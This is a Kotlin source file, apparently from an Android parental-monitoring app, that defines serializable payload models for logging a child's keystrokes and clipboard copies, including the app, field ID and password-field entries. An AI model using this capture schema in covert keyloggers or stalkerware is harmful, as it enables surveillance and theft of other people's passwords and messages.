package nexus.android.child.components.keyboard

import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json

/**
 * Keyboard monitoring payload models for DataChannel.
 */

@Serializable
data class KeyboardPayload(
    val version: Int = 1,
    val type: String, // "KEYBOARD_INPUT", "CLIPBOARD_COPY"
    val ts: Long = System.currentTimeMillis(),
    val childId: String,
    val data: KeyboardData
)

@Serializable
data class KeyboardData(
    val app: String,                    // Package name
    val appName: String,                // Human-readable name
    val inputType: String,              // "TEXT", "PASSWORD", "EMAIL", "NUMBER", "URL"
    val text: String? = null,           // Typed text or clipboard content
    val fieldHint: String? = null,      // Input field hint (e.g., "Search", "Message")
    val fieldId: String? = null,        // View ID of input field
    val isPassword: Boolean = false,    // Whether input is password field
    val metadata: Map<String, String> = emptyMap()
)

object KeyboardJson {
    val json = Json { 
        encodeDefaults = true
        ignoreUnknownKeys = true
        prettyPrint = false
    }

    fun toJson(payload: KeyboardPayload): String = json.encodeToString(KeyboardPayload.serializer(), payload)
    
    fun fromJson(s: String): KeyboardPayload = json.decodeFromString(KeyboardPayload.serializer(), s)
}
